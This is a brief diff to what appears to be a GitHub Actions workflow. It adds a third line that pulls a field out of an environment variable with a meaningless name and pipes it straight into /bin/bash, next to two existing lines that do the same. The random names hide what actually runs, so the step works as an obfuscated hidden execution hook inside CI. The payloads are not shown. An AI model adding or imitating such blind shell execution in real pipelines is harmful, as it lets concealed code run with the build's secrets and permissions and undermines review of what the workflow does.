@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$l56" | jq -r .fi222 | /bin/bash
           echo $jzin96327 | jq -r .weywq4248 | /bin/bash
+          echo $nj360 | jq -r .w59 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
